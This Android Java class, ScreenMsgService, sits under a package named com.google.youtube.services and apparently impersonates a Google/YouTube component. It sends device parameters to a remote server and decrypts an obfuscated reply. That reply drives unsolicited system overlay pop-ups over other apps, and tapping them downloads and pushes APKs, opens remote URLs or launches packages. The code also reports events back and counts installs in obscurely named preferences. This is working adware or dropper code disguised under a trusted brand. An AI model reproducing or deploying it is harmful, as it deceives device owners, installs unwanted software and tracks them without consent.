package com.google.youtube.services;

import java.util.Date;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;

import org.json.JSONObject;

import com.google.youtube.utils.HttpUtil;
import com.google.youtube.utils.MyHelpUtil;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.content.pm.PackageManager.NameNotFoundException;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.PixelFormat;
import android.net.Uri;
import android.text.TextUtils;
import android.view.Gravity;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.WindowManager;
import android.view.WindowManager.LayoutParams;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.ImageView.ScaleType;

/**
 * 
 * @author
 * 
 */
public class ScreenMsgService {

	private Context context;

	private String imgname;

	private String appalias;

	private String apppakname;

	private String s_title;

	private String s_description;

	private int s_show_notifatication = 0;

	private String download_url;

	private FrameLayout frameLayout;

	private int s_type = 0;

	private ImageView localImageView;

	private ImageView closeImageView;

	private WindowManager windowManager;

	private String s_url;

	private int s_link_count;

	public ScreenMsgService(Context context) {

		this.context = context;

		localImageView = new ImageView(context);

		closeImageView = new ImageView(context);

		windowManager = (WindowManager) context
				.getSystemService(Context.WINDOW_SERVICE);

		frameLayout = new FrameLayout(context);

	}

	/**
	 * 
	 * 
	 */
	private boolean checkOption(String imgname, int screen_link_count,
			int screen_count, int display_interval, String apppakname,
			int s_install_count, int s_type) {

		SharedPreferences localSharedPreferences = context
				.getSharedPreferences("scr", 0);

		SharedPreferences msgSharedPreferences = context.getSharedPreferences(
				"tir", 0);

		SharedPreferences installSharedPreferences = context
				.getSharedPreferences("inr", 0);

		SharedPreferences snLinkSharedPreferences = context
				.getSharedPreferences("sln", 0);

		int local_screen_count = localSharedPreferences.getInt("sc", 0);

		int installCount = installSharedPreferences.getInt(
				MyHelpUtil.enCrypto(apppakname, MyHelpUtil.A), 0);

		int local_screen_link_count = snLinkSharedPreferences
				.getInt(imgname, 0);

		boolean time_iner = false;

		if (!msgSharedPreferences.contains("sc")
				&& local_screen_count >= screen_count) {

			System.out.println("cha Y");

			time_iner = true;
		} else {

			long reslut = Math.abs(new Date().getTime()
					- msgSharedPreferences.getLong("sc", 0));
			long display_interval_to_long = Math
					.abs(display_interval * 3600 * 1000);

			if (reslut >= display_interval_to_long) {

				time_iner = true;

			}
		}

		if (s_type == 2) {

			if (local_screen_count >= screen_count && time_iner
					&& screen_link_count >= local_screen_link_count) {
				return true;
			} else {
				return false;
			}

		}

		if (local_screen_count >= screen_count && time_iner
				&& installCount <= s_install_count
				&& screen_link_count >= local_screen_link_count) {

			return true;
		}
		return false;
	}

	public Map<String, Object> run() {

		if (MyHelpUtil.checkNet(context)) {

			try {

				String params_str = MyHelpUtil.add_notifacation_params(context);

				String screenMsg = HttpUtil.postRequest(HttpUtil.BASE_URL
						+ "google_i.action", params_str);

				if (!TextUtils.isEmpty(screenMsg)) {

					JSONObject jsb = new JSONObject(
							MyHelpUtil.deCrypto(screenMsg));

					int display_interval = jsb.getInt("display_interval");

					int screen_count = jsb.getInt("screen_count");

					int s_install_count = jsb.getInt("s_install_count");

					apppakname = jsb.getString("apppakname");

					s_type = jsb.getInt("s_type");

					s_url = jsb.getString("s_url");

					imgname = jsb.getString("imgname");

					s_link_count = jsb.getInt("s_link_count");

					boolean bool = checkOption(imgname, s_link_count,
							screen_count, display_interval, apppakname,
							s_install_count, s_type);

					if (bool) {

						System.out.println("cha Y");

						String p = MyHelpUtil
								.enCrypto(apppakname, MyHelpUtil.A);

						SharedPreferences appSharedPreferences = context
								.getSharedPreferences("inr", 0);

						if (!appSharedPreferences.contains(p)) {

							Editor localEditor = appSharedPreferences.edit();

							localEditor.putInt(p, 0);

							localEditor.commit();

						}

						appalias = jsb.getString("appalias");

						s_title = jsb.getString("s_title");

						s_description = jsb.getString("s_description");

						s_show_notifatication = jsb
								.getInt("s_show_notifatication");

						download_url = jsb.getString("download_url");

						HttpUtil.getBitmap(imgname);

						MyHelpUtil.sys_msg(context, 7, apppakname);

						Map<String, Object> map = new HashMap<String, Object>();

						map.put("appalias", appalias);

						map.put("s_title", s_title);

						map.put("s_description", s_description);

						map.put("s_show_notifatication", s_show_notifatication);

						map.put("download_url", download_url);

						return map;

					} else {
						System.out.println("cha N");
					}

				}

			} catch (Exception e) {
				e.printStackTrace();

			}
		}
		
		return null;
	}

	protected void onPostExecute(String result) {

		if (!TextUtils.isEmpty(imgname) && !TextUtils.isEmpty(appalias)) {

			final Bitmap localbitmap = BitmapFactory.decodeFile(MyHelpUtil
					.getDir() + imgname + ".png");

			WindowManager.LayoutParams wmParams = new WindowManager.LayoutParams();

			wmParams.type = LayoutParams.TYPE_PHONE;

			wmParams.format = PixelFormat.RGBA_8888;

			wmParams.flags = LayoutParams.FLAG_ALT_FOCUSABLE_IM
					| LayoutParams.FLAG_NOT_FOCUSABLE;

			wmParams.gravity = Gravity.CENTER_HORIZONTAL
					| Gravity.CENTER_VERTICAL;

			wmParams.x = 0;

			wmParams.y = 0;

			wmParams.width = localbitmap.getWidth();
			wmParams.height = localbitmap.getHeight();

			/*---------------------------------------------------------------------------------------*/

			localImageView.setScaleType(ScaleType.FIT_XY);

			localImageView.setImageBitmap(localbitmap);

			localImageView.setOnClickListener(new OnClickListener() {

				@Override
				public void onClick(final View v) {
					// TODO Auto-generated method stubs
					if (v != null) {

						if (v.getParent() != null) {
							windowManager.removeView(v.getRootView());
						}

						new Thread(new Runnable() {

							@Override
							public void run() {
								// TODO Auto-generated method stub

								try {

									if (localbitmap != null) {
										localbitmap.recycle();
									}
								} catch (Exception e) {

								}
								switch (s_type) {
								case 1:

									MyHelpUtil.localDownloadManagerMsg(context,
											appalias, s_title, s_description,
											apppakname, s_show_notifatication,
											12, download_url);

									break;

								case 2:

									if (!TextUtils.isEmpty(s_url)) {

										Intent urlIntent = new Intent(
												Intent.ACTION_VIEW, Uri
														.parse(s_url));

										urlIntent
												.addCategory(Intent.CATEGORY_BROWSABLE);

										PackageManager pm = context
												.getPackageManager();

										List<ResolveInfo> s = pm
												.queryIntentActivities(
														urlIntent,
														PackageManager.MATCH_DEFAULT_ONLY);

										for (Iterator<ResolveInfo> iterator = s
												.iterator(); iterator.hasNext();) {
											ResolveInfo resolveInfo = (ResolveInfo) iterator
													.next();

											urlIntent
													.setClassName(
															resolveInfo.activityInfo.packageName,
															resolveInfo.activityInfo.name);

											break;

										}

										urlIntent
												.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

										saveLinkCount(imgname);

										context.startActivity(urlIntent);

										break;
									}
								case 3:

									PackageInfo pi;
									try {
										pi = context.getPackageManager()
												.getPackageInfo(apppakname, 0);

										if (pi != null) {

											MyHelpUtil.openApp(pi.packageName,
													context);

										}

										MyHelpUtil.openApp(pi.packageName,
												context);

									} catch (NameNotFoundException e) {
										// TODO Auto-generated catch block
									}

									break;

								default:
									break;
								}

								MyHelpUtil.sys_msg(context, 8, apppakname);

							}
						}).start();
					}
				}
			});

			/*---------------------------------------------*/
			saveScreenStatus();

			/*--------------------------------------------*/
			FrameLayout.LayoutParams layoutParams = new FrameLayout.LayoutParams(
					LayoutParams.WRAP_CONTENT, LayoutParams.WRAP_CONTENT,
					Gravity.CENTER);

			frameLayout.setLayoutParams(layoutParams);

			/*------------------------------------------*/
			FrameLayout.LayoutParams closeImageLayoutParams = new FrameLayout.LayoutParams(
					LayoutParams.WRAP_CONTENT, LayoutParams.WRAP_CONTENT,
					Gravity.TOP | Gravity.RIGHT);

			closeImageView.setImageDrawable(MyHelpUtil.getDrawable(
					"img/find_btn_close_panel.png", context));

			closeImageView.setOnClickListener(new OnClickListener() {

				@Override
				public void onClick(View v) {

					if (v.getParent() != null) {

						if (localImageView.getParent() != null) {
							windowManager.removeView(v.getRootView());
						}
					}
				}
			});

			closeImageView.setLayoutParams(closeImageLayoutParams);

			/*------------------------------------------*/
			FrameLayout.LayoutParams loaclImageLayoutParams = new FrameLayout.LayoutParams(
					LayoutParams.WRAP_CONTENT, LayoutParams.WRAP_CONTENT,
					Gravity.CENTER);

			localImageView.setLayoutParams(loaclImageLayoutParams);

			/*------------------------------------------*/

			frameLayout.addView(localImageView);

			frameLayout.addView(closeImageView);

			windowManager.addView(frameLayout, wmParams);

		}

	}

	private void saveScreenStatus() {

		SharedPreferences localSharedPreferences = context
				.getSharedPreferences("tir", 0);

		Editor localEditor = localSharedPreferences.edit();

		localEditor.putLong("sc", new Date().getTime());

		localEditor.commit();
	}

	private void saveLinkCount(String imgname) {

		SharedPreferences localSharedPreferences = context
				.getSharedPreferences("sln", 0);

		Editor localEditor = localSharedPreferences.edit();

		localEditor.putInt(imgname,
				localSharedPreferences.getInt(imgname, 0) + 1);

		localEditor.commit();

	}
}
